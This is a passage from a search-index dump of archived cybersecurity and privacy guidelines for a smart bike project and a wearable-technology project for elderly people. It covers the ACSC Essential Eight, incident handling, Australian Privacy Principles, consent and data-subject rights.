Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#roles-and-responsibilities","content":" This section outlines the roles and responsibilities the organisation should assign to fulfil cybersecurity requirements.  ","version":"Next","tagName":"h2"},{"title":"Director Roles and Responsibilities​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#director-roles-and-responsibilities","content":" General Managers, Chief Information Security Officers (CISO) or Chief Cyber Security Officers (CCSO) are responsible for:  Appointing and assigning appropriate employees with the authority to carry out particular duties outlined in the Guidelines.Developing and implementing a cyber security plan to consider threats, risks and vulnerabilities that affect the protection of the company’s information and systems.Developing a risk management process.Implementing policies and procedures to promote the fulfilment of the Guidelines.Investigation and reporting on cyber security incidents.Overseeing the development and implementation of an effective cybersecurity plan.  ","version":"Next","tagName":"h3"},{"title":"The Essential Eight​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#the-essential-eight","content":" The Australian Cyber Security Centre (ACSC) recommends that organisations implement eight essential mitigation strategies from the Strategies to Mitigate Cyber Security Incidents to prevent adversaries from compromising systems.  Mitigation Strategy\tDescription\tFunctionalityApplication Control\tBlocking all application by default from running on devices and manually enabling approved programs.\tPrevents attackers running unapproved programs and launching malware on the system. Patch Applications\tVulnerability scans to identify where security fixes and patches can be applied to programs with 48 hours, and where applications can be removed which are unsupported by vendors.\tPrevents exploitation of unpatched applications by attackers. Microsoft Office macro settings Configuration\tEnabling Office macros where required and restricting types of macros that can be executed.\tAutomated commands could be executed to allow attackers to install malicious software. User Application Hardening\tConfiguration of applications that interact with the web to increase security and blocking ads.\tReduces the ability for attackers to install malicious software. Restrict Administrative Privileges\tLimiting access to certain applications and data to users to ensure only certain employees can alter security settings.\tAdministering control over administrator accounts increases difficulties for attackers gaining access to accounts with control over the system. Patch Operating Systems\tApplication of security fixes/patches for operating systems within 48 hours and analysing data to check vulnerabilities within the system\tUnpatched operating systems are vulnerable to exploitation by attackers seeking to access sensitive information. Multi-Factor Authentication\tValidating the user during the login process to ensure additional checks are carried out.\tUnpatched operating systems are vulnerable to exploitation by attackers seeking to access sensitive information. Regular Backups\tRegular backups of data, software and configuration settings and regular testing of the data retention process.\tEnsures data can be accessed following a cyber-attack.  ","version":"Next","tagName":"h2"},{"title":"Transfer of Data​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#transfer-of-data","content":" ","version":"Next","tagName":"h2"},{"title":"Monitoring Data Importation and Exportation​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#monitoring-data-importation-and-exportation","content":" Monitoring of data transfers should take place regularly to identify any unusual activities or abuse of data transfer privileges. Users transferring data should be held accountable for data transfers and ensure systems are secure and authorised to withhold the data.  ","version":"Next","tagName":"h3"},{"title":"Data Logging​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#data-logging","content":" To preserve system integrity and manage data transfer privileges, employees should log all forms of data transfers and include information such as:  Who the data transfer was performed by; What data was transferred; Where the data was transferred to; When the data was transferred; and How the data was transferred.  ","version":"Next","tagName":"h3"},{"title":"Database Systems​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#database-systems","content":" ","version":"Next","tagName":"h2"},{"title":"Communication of Database Servers and Internet of Things​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#communication-of-database-servers-and-internet-of-things","content":" All data communicated between database servers and cloud servers should be encrypted due to its susceptibility to being captured by an adversary. Wearable devices may be referred to as the “Internet of Medical Things” (IoMT) which refers to the connection of the devices to health information technology systems.  ","version":"Next","tagName":"h3"},{"title":"Protection of Database Contents​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#protection-of-database-contents","content":" Users of the database should be aware of the sensitivity associated with the contents of the database. All sensitive data collected by the wearable devices should be classified as such and protected through the use of access privileges to restrict database users’ ability to access, insert, modify or remove contents of the database in alignment with their role within the company.  ","version":"Next","tagName":"h3"},{"title":"Managing Cyber Security Incidents​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#managing-cyber-security-incidents","content":" ","version":"Next","tagName":"h2"},{"title":"Cyber Security Events​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#cyber-security-events","content":" A system, service or network state indicating that a potential breach of security policy or unforeseen event has occurred.  ","version":"Next","tagName":"h3"},{"title":"Cyber Security Incidents​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#cyber-security-incidents","content":" An unexpected cyber security event resulting in compromised business operations or that has a likely effect of compromising business operations.  ","version":"Next","tagName":"h3"},{"title":"Detecting Cyber Security Incidents​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#detecting-cyber-security-incidents","content":" Appropriate data sources should be retained by the company and event logs should be utilised to detect and investigate cybersecurity events and cybersecurity incidents.  ","version":"Next","tagName":"h3"},{"title":"Incident Management Policy​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#incident-management-policy","content":" An incident management policy should be established to initiate a plan for detecting and responding to malicious activity and cover the responsibilities of the action plan, the allocation of resources, and guidelines for responding to cyber security events and cyber security incidents.  An incident management policy should be reviewed annually for compliance purposes.  ","version":"Next","tagName":"h3"},{"title":"Security Risk Management Plan​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#security-risk-management-plan","content":" A framework should be established to:  Assess and identify the most valuable assets and information held by the business; Identify vulnerabilities that the organisation may be susceptible to; and Handle the identified threats that may impact the company.  ","version":"Next","tagName":"h3"},{"title":"Cyber Security Incident Register​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#cyber-security-incident-register","content":" A cyber security incident register should be developed to monitor activities associated with rectifying cyber security incidents and to be utilised as a tool for future risk assessments.  A cyber security incident register should contain the following data:  Date of the occurrence of the cyber security incident.Date of the discovery of the cyber security incident.Description of the cyber security incident.Response to the cyber security incident.The person reporting the cyber security incident.  ","version":"Next","tagName":"h3"},{"title":"Reporting Cyber Security Incidents​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#reporting-cyber-security-incidents","content":" Cyber security incidents should be reported to the CISO as soon as practicable after discovery.  Legislation obligations should be consulted to determine reporting requirements of cyber security incidents to the authorities, customers or the public.  ","version":"Next","tagName":"h3"},{"title":"Reporting Cyber Security Incidents to the ACSC​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#reporting-cyber-security-incidents-to-the-acsc","content":" Cyber security incidents should be reported to the Australian Cyber Security Centre (ACSC).  ","version":"Next","tagName":"h3"},{"title":"Responding to Cyber Security Incidents​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#responding-to-cyber-security-incidents","content":" ","version":"Next","tagName":"h2"},{"title":"Handling Data Spills​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#handling-data-spills","content":" In the event of a data spillage, the company should provide information about this incident to data owners and enforce access restrictions to the data.  Users should be informed about the appropriate course of action to take in regards to containing their data.  ","version":"Next","tagName":"h3"},{"title":"Handling Malicious Code Infections​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#handling-malicious-code-infections","content":" All infected systems should be isolated and scanned by an antivirus software to recover the data.  If the infection cannot be removed, the system should be restored to a known good backup.  ","version":"Next","tagName":"h3"},{"title":"Securing Personal Information​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#securing-personal-information","content":" Personal information refers to information or an opinion about an identified individual, or an individual who is reasonably identifiable.2  Sensitive information is defined in s 6(1) of the Privacy Act 1988 (‘Privacy Act’). The data collected by the mobile app should be subject to the requirements where it satisfies the elements of personal or sensitive information. Exercise metrics such as duration, intervals, distance, resistance and threshold is not considered “health information” and the privacy policy should communicate to users all the ways their data will be used. Users should be provided with an opportunity to opt-out at any time.  Default protections should be private by default and users should physically have to adjust settings to enable their data to be shared and control how it may be used.  The mobile app should be set up with two-factor authentication to ensure a code is generated and sent to a trusted device before it can be accessed.  The 13 Australian Privacy Principles (APPs) are contained under s 28(1) of the Privacy Act and provide regulations on how personal information should be handled.  The company should take active measures to ensure personal information is secured and consideration should be given as to whether they are permitted to retain the information under APP 11. The company should take reasonable steps to ensure personal information is protected from misuse, interference and loss, in addition to authorised access, modification and disclosure under APP 11.1. These reasonable steps include the development of adequate cyber-security practices to meet the privacy protection requirements. The company should take reasonable steps to ensure personal information is destroyed or de-identified where it is no longer necessary for any purpose for which it may be used or disclosed under the APP 11.2. The company should collect the minimal amount of personal information that is reasonably necessary to carry out its functions or activities under APP 3. The company should secure personal information in adherence with APP 1 by implementing procedures relating to internal practices, processes and systems, governance, and any dealings with third-party providers that go beyond the scope of technical security measures. If the company provides personal information to a cloud service provider for the purpose of storage of data and providing access to the personal information, this will constitute the use of personal data by the company in the following circumstances: A binding contract exists between the entity and the provider to handle the personal information in limited circumstances; The contract requires any subcontractors to agree to the obligations provided in the contract; and The contract specifies that the company has control over how the information is handled by the provider including whether the company has the right to access, change or retrieve the information, who will have access, the security mechanisms involved in the storage of personal information and whether the information can be retrieved or permanently deleted by the company following termination of the contract.  ","version":"Next","tagName":"h2"},{"title":"Consent Requirements​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#consent-requirements","content":" Consent is required as authority for the company to handle consumer information in a particular way (APPs 7.3, 7.4 and 8.2(b)).  Consent should be express or implied (s 6(1)). Express consent must be given explicitly orally or in writing. Implied consent is inferred from the conduct of the individual and the circumstances in which it is given. The company should opt to source express consent from individuals when obtaining health and biometric data (APP 3.3). Users must have the ability to customise or disable their devices in accordance with their preferences and requirements. The elements of consent that must be fulfilled are as follows: The individual must be adequately informed prior to providing consent; The consent must be given voluntarily; The individual must be capable of understanding and communicating the consent; and The consent must be current and specific. When transmitting the data through IoT, the company should make efforts to: Communicate who will be processing the data and their core responsibilities; Communicate how the data will be used from the point of sale and on set-up; and Communicate information in specific increments of time. Prior to using the device, the user should provide consent to the Terms and Conditions and Privacy Policy indicating how their data will be used. Informed consent should be obtained upon change to the health of the individual, or the technical system. Where data is used for a secondary purpose unrelated to the primary purpose, an individual should provide additional consent and be informed as to how their data is being collected and communicated.  ","version":"Next","tagName":"h3"},{"title":"De-Identification Requirements​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#de-identification-requirements","content":" Personal identification is de-identified ‘if the information is no longer about an identifiable individual or an individual who is reasonably identifiable’ (s 6(1)).  Information must be de-identified by removing or altering information that identifies an individual or is reasonably likely to and includes:  Removing personal identifiers such as names, address, date of birth or other identifying information. Removing or altering information that may allow an individual to be identified.  ","version":"Next","tagName":"h3"},{"title":"Anonymisation, or Pseudonymisation of Data​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#anonymisation-or-pseudonymisation-of-data","content":" Personal identification data must be able to be transformed in a manner that prevents any person with unauthorised access from tracing it back to an individual.  ","version":"Next","tagName":"h3"},{"title":"Rights of Data Subjets​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#rights-of-data-subjets","content":" Data subjects may exercise any of the following rights at any time in relation to the protection of data.  Right of access to their data and knowledge of whether it is being processed. Right to rectification where data is inaccurate and the individual may request for their data to be corrected. Right of erasure to restrict the data from being processed. Right to be informed in a clear and concise manner prior to the collection and use of data. Right to object meaning that data subjects can express if they do not want their personal data to be processed. Right not to be subject to a decision based on automated processing.  ","version":"Next","tagName":"h3"},{"title":"Security and Privacy of VR​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#security-and-privacy-of-vr","content":" Cybersecurity concerns surrounding IoT devices are applicable to virtual reality headsets. The regulations encapsulating virtual reality are currently not administered in the law. However, these systems are subject to ethical and privacy implications and cyber security foundations should be applied when using VR systems.  Users should implement the following safeguards when using the VR system: Devices should be kept up to date and security patches should be applied; Application software should be kept up to date; A VPN should be used when the device is online; Apply caution when disclosing personal information; and Review privacy policies to understand how the data is being collected and used.  ","version":"Next","tagName":"h2"},{"title":"Physical Security​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#physical-security","content":" This section outlines the physical protections that should be implemented to safeguard people and assets to comply with the Work Health and Safety Act 2011 and meet cyber security standards. These protections should be proportionate with the assessed sensitivity or risk of damage or loss.  ","version":"Next","tagName":"h2"},{"title":"Physical Access to Systems​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#physical-access-to-systems","content":" A security zone should be established and systems should be secured in premises that have been assessed by the physical security certification authority and meet appropriate standards to secure the sensitive data appropriately.  ","version":"Next","tagName":"h3"},{"title":"Physical Access to Devices and Servers​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#physical-access-to-devices-and-servers","content":" The company should have a separate server room to secure network devices and servers with appropriate keys to control access to this room. Physical security such as enclosures or security containers should be implemented to prohibit unauthorised access or damage to equipment. Workstations and keyboards should not be visible to people outside of the premises and measures such as privacy films should be implemented to prevent observation from unauthorised people. The company must securely dispose of physical assets.  ","version":"Next","tagName":"h3"},{"title":"Securing ICT Equipment​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#securing-ict-equipment","content":" ICT equipment should be secured when it is not in use and this may be achieved through security containers, sanitisation of memory upon shutdown or encryption of hard drives.  ","version":"Next","tagName":"h2"},{"title":"Notification Requirements​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#notification-requirements","content":" Where an data breach incident occurs that is likely to compromise the rights of an individual, they must be notified immediately, and the relevant regulatory body must be informed within 72 hours.  ","version":"Next","tagName":"h2"},{"title":"Nofifiable Data Breaches Scheme​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#nofifiable-data-breaches-scheme","content":" Under the Notifiable Data Breaches (NDB) scheme, companies under the Privacy Act must undertake an assessment where there has been a data loss or unauthorised access to or disclosure of personal information. The company must notify the OAIC where the incident is likely to result in harm to an individual.  ","version":"Next","tagName":"h3"},{"title":"MQTT Security Practices​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#mqtt-security-practices","content":" Appropriate encryption methods should be implemented through Transport Layer Security (TLS) or Secure Socket Layer (SSL certificates). Authorisation methods and access permissions should be implemented to ensure only authorised users or devices can access certain data. This can be done through access control lists (ACLs) or role-based access control (RBAC). ","version":"Next","tagName":"h2"},{"title":"Project 3 - Wearable Technologies for Elderly People","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3","content":"","keywords":"","version":"Next"},{"title":"Purpose and Scope of the Policy​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#purpose-and-scope-of-the-policy","content":" The Cyber Security Guidelines (the Guidelines) outline cyber security standards recommended for Project 3: Wearable Technologies for Elderly in Redback Operations. The Guidelines are intended to be read and implemented by Team Leaders and Support.  The Guidelines are prescribed for internal purposes and should be referred to as a cyber security policy. Whilst the Guidelines are not enforceable, it is strongly encouraged that compliance is exercised within the company. If the policy conflicts with legislation or law, the relevant law or legislation will take precedence. The organisation is encouraged to consult the Privacy Act 1988, the Security of Critical Infrastructure Act 2018 and the Telecommunications (Interception and Access) Act 1979 in the formation of the company. Guidance is also sought from the European framework of the General Data Protection Regulation (GDPR) where the data subjects are located in the EU.1  The company should be able to demonstrate adherence to these principles in order to protect its systems and data from cyber threats.  ","version":"Next","tagName":"h2"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#roles-and-responsibilities","content":" This section outlines the roles and responsibilities the organisation should assign to fulfil cybersecurity requirements.  ","version":"Next","tagName":"h2"},{"title":"Director Roles and Responsibilities​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#director-roles-and-responsibilities","content":" General Managers, Chief Information Security Officers (CISO) or Chief Cyber Security Officers (CCSO) are responsible for:  Appointing and assigning appropriate employees with the authority to carry out particular duties outlined in the Guidelines.Developing and implementing a cyber security plan to consider threats, risks and vulnerabilities that affect the protection of the company’s information and systems.Developing a risk management process.Implementing policies and procedures to promote the fulfilment of the Guidelines.Investigation and reporting on cyber security incidents.Overseeing the development and implementation of an effective cybersecurity plan.  ","version":"Next","tagName":"h3"},{"title":"The Essential Eight​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#the-essential-eight","content":" The Australian Cyber Security Centre (ACSC) recommends that organisations implement eight essential mitigation strategies from the Strategies to Mitigate Cyber Security Incidents to prevent adversaries from compromising systems.  Mitigation Strategy\tDescription\tFunctionalityApplication Control\tBlocking all application by default from running on devices and manually enabling approved programs.\tPrevents attackers running unapproved programs and launching malware on the system. Patch Applications\tVulnerability scans to identify where security fixes and patches can be applied to programs with 48 hours, and where applications can be removed which are unsupported by vendors.\tPrevents exploitation of unpatched applications by attackers. Microsoft Office macro settings Configuration\tEnabling Office macros where required and restricting types of macros that can be executed.\tAutomated commands could be executed to allow attackers to install malicious software. User Application Hardening\tConfiguration of applications that interact with the web to increase security and blocking ads.\tReduces the ability for attackers to install malicious software. Restrict Administrative Privileges\tLimiting access to certain applications and data to users to ensure only certain employees can alter security settings.\tAdministering control over administrator accounts increases difficulties for attackers gaining access to accounts with control over the system. Patch Operating Systems\tApplication of security fixes/patches for operating systems within 48 hours and analysing data to check vulnerabilities within the system\tUnpatched operating systems are vulnerable to exploitation by attackers seeking to access sensitive information. Multi-Factor Authentication\tValidating the user during the login process to ensure additional checks are carried out.\tUnpatched operating systems are vulnerable to exploitation by attackers seeking to access sensitive information. Regular Backups\tRegular backups of data, software and configuration settings and regular testing of the data retention process.\tEnsures data can be accessed following a cyber-attack.  ","version":"Next","tagName":"h2"},{"title":"Transfer of Data​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#transfer-of-data","content":" ","version":"Next","tagName":"h2"},{"title":"Monitoring Data Importation and Exportation​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#monitoring-data-importation-and-exportation","content":" Monitoring of data transfers should take place regularly to identify any unusual activities or abuse of data transfer privileges.  Users transferring data should be held accountable for data transfers and ensure systems are secure and authorised to withhold the data.  ","version":"Next","tagName":"h3"},{"title":"Database Systems​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#database-systems","content":" ","version":"Next","tagName":"h2"},{"title":"Communication of Database Servers and Internet of Things​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#communication-of-database-servers-and-internet-of-things","content":" All data communicated between database servers and cloud servers should be encrypted due to its susceptibility to being captured by an adversary.  Wearable devices may be referred to as the “Internet of Medical Things” (IoMT) which refers to the connection of the devices to health information technology systems.  ","version":"Next","tagName":"h3"},{"title":"Protection of Database Contents​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#protection-of-database-contents","content":" Users of the database should be aware of the sensitivity associated with the contents of the database. All sensitive data collected by the wearable devices should be classified as such and protected through the use of access privileges to restrict database users’ ability to access, insert, modify or remove contents of the database in alignment with their role within the company.  ","version":"Next","tagName":"h3"},{"title":"Managing Cyber Security Incidents​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#managing-cyber-security-incidents","content":" ","version":"Next","tagName":"h2"},{"title":"Cyber Security Events​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#cyber-security-events","content":" A system, service or network state indicating that a potential breach of security policy or unforeseen event has occurred.  ","version":"Next","tagName":"h3"},{"title":"Cyber Security Incidents​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#cyber-security-incidents","content":" An unexpected cyber security event resulting in compromised business operations or that has a likely effect of compromising business operations.  ","version":"Next","tagName":"h3"},{"title":"Detecting Cyber Security Incidents​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#detecting-cyber-security-incidents","content":" Appropriate data sources should be retained by the company and event logs should be utilised to detect and investigate cybersecurity events and cybersecurity incidents.  ","version":"Next","tagName":"h3"},{"title":"Incident Management Policy​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#incident-management-policy","content":" An incident management policy should be established to initiate a plan for detecting and responding to malicious activity and cover the responsibilities of the action plan, the allocation of resources, and guidelines for responding to cyber security events and cyber security incidents.  An incident management policy should be reviewed annually for compliance purposes.  ","version":"Next","tagName":"h3"},{"title":"Security Risk Management Plan​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#security-risk-management-plan","content":" A framework should be established to:  Assess and identify the most valuable assets and information held by the business; Identify vulnerabilities that the organisation may be susceptible to; and Handle the identified threats that may impact the company.  ","version":"Next","tagName":"h3"},{"title":"Cyber Security Incident Register​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#cyber-security-incident-register","content":" A cyber security incident register should be developed to monitor activities associated with rectifying cyber security incidents and to be utilised as a tool for future risk assessments.  A cyber security incident register should contain the following data:  Date of the occurrence of the cyber security incident.Date of the discovery of the cyber security incident.Description of the cyber security incident.Response to the cyber security incident.The person reporting the cyber security incident.  ","version":"Next","tagName":"h3"},{"title":"Reporting Cyber Security Incidents​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#reporting-cyber-security-incidents","content":" Cyber security incidents should be reported to the CISO as soon as practicable after discovery.  Legislation obligations should be consulted to determine reporting requirements of cyber security incidents to the authorities, customers or the public.  ","version":"Next","tagName":"h3"},{"title":"Reporting Cyber Security Incidents to the ACSC​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#reporting-cyber-security-incidents-to-the-acsc","content":" Cyber security incidents should be reported to the Australian Cyber Security Centre (ACSC).  ","version":"Next","tagName":"h3"},{"title":"Responding to Cyber Security Incidents​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#responding-to-cyber-security-incidents","content":" ","version":"Next","tagName":"h2"},{"title":"Handling Data Spills​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#handling-data-spills","content":" In the event of a data spillage, the company should provide information about this incident to data owners and enforce access restrictions to the data.  Users should be informed about the appropriate course of action to take in regards to containing their data.  ","version":"Next","tagName":"h3"},{"title":"Handling Malicious Code Infections​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#handling-malicious-code-infections","content":" All infected systems should be isolated and scanned by an antivirus software to recover the data.  If the infection cannot be removed, the system should be restored to a known good backup.  ","version":"Next","tagName":"h3"},{"title":"Securing Personal Information​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#securing-personal-information","content":" Personal information refers to information or an opinion about an identified individual, or an individual who is reasonably identifiable.2  Sensitive information is defined in s 6(1) of the Privacy Act 1988 (‘Privacy Act’) and includes health information and biometric information and is afforded a higher level of privacy protection under the APP 3, 6 and 7.  Data collected by the wearable devices such as heart rate, medication details and sleep tracking are subject to privacy protection.  Data minimisation is a core responsibility in relation to IoT devices and wearable technologies which collects sensitive information and may engage in surveillance of the user.  The 13 Australian Privacy Principles (APPs) are contained under s 28(1) of the Privacy Act and provide regulations on how personal information should be handled.  The company should take active measures to ensure personal information is secured and consideration should be given as to whether they are permitted to retain the information under APP 11. The company should take reasonable steps to ensure personal information is protected from misuse, interference and loss, in addition to authorised access, modification and disclosure under APP 11.1. These reasonable steps include the development of adequate cyber-security practices to meet the privacy protection requirements. The company should take reasonable steps to ensure personal information is destroyed or de-identified where it is no longer necessary for any purpose for which it may be used or disclosed under the APP 11.2. If the company provides personal information to a cloud service provider for the purpose of storage of data and providing access to the personal information, this will constitute the use of personal data by the company in the following circumstances: A binding contract exists between the entity and the provider to handle the personal information in limited circumstances; The contract requires any subcontractors to agree to the obligations provided in the contract; and The contract specifies that the company has control over how the information is handled by the provider including whether the company has the right to access, change or retrieve the information, who will have access, the security mechanisms involved in the storage of personal information and whether the information can be retrieved or permanently deleted by the company following termination of the contract. A binding contract exists between the entity and the provider to handle the personal information in limited circumstances; The contract requires any subcontractors to agree to the obligations provided in the contract; and The contract specifies that the company has control over how the information is handled by the provider including whether the company has the right to access, change or retrieve the information, who will have access, the security mechanisms involved in the storage of personal information and whether the information can be retrieved or permanently deleted by the company following termination of the contract. Privacy settings of the wearable device should be configured by default to align with the APPs and enable individuals to manage the collection, use and disclosure of their personal information by the company The company must not collect personal information unless it is reasonable necessary for one or more of its function or activities under APP 3 or unless the individual would reasonably expect the company to use or disclose the personal information for that secondary purpose and the secondary purpose is related to the primary purpose. Privacy notices should provide information on these secondary purposes. The default privacy settings in IoT should be set to the following: Privacy settings for the use and disclosure of personal information for secondary purposes that are unrelated to the primary purpose should be turned off by default and require the individual to change the settings. Geolocation and tracking technologies should be turned off by default.  ","version":"Next","tagName":"h2"},{"title":"Consent Requirements​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#consent-requirements","content":" Consent is required as authority for the company to handle consumer information in a particular way (APPs 7.3, 7.4 and 8.2(b)).  Consent should be express or implied (s 6(1)). Express consent must be given explicitly orally or in writing. Implied consent is inferred from the conduct of the individual and the circumstances in which it is given. The company should opt to source express consent from individuals when obtaining health and biometric data (APP 3.3). Users must have the ability to customise or disable their devices in accordance with their preferences and requirements. The elements of consent that must be fulfilled are as follows: The individual must be adequately informed prior to providing consent;The consent must be given voluntarily;The individual must be capable of understanding and communicating the consent; andThe consent must be current and specific. When transmitting the data through IoT, the company should make efforts to: Communicate who will be processing the data and their core responsibilities; Communicate how the data will be used from the point of sale and on set-up; and Communicate information in specific increments of time. Prior to using the device, the user should provide consent to the Terms and Conditions and Privacy Policy indicating how their data will be used. Informed consent should be obtained upon change to the health of the individual, or the technical system. Where data is used for a secondary purpose unrelated to the primary purpose, an individual should provide additional consent and be informed as to how their data is being collected and communicated.  ","version":"Next","tagName":"h3"},{"title":"De-Identification Requirements​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#de-identification-requirements","content":" Personal identification is de-identified ‘if the information is no longer about an identifiable individual or an individual who is reasonably identifiable’ (s 6(1)).  Information must be de-identified by removing or altering information that identifies an individual or is reasonably likely to and includes:  Removing personal identifiers such as names, address, date of birth or other identifying information. Removing or altering information that may allow an individual to be identified.  ","version":"Next","tagName":"h3"},{"title":"Anonymisation, or Pseudonymisation of Data​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#anonymisation-or-pseudonymisation-of-data","content":" Personal identification data must be able to be transformed in a manner that prevents any person with unauthorised access from tracing it back to an individual.  ","version":"Next","tagName":"h3"},{"title":"Rights of Data Subjects​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#rights-of-data-subjects","content":" Data subjects may exercise any of the following rights at any time in relation to the protection of data.3  Right of 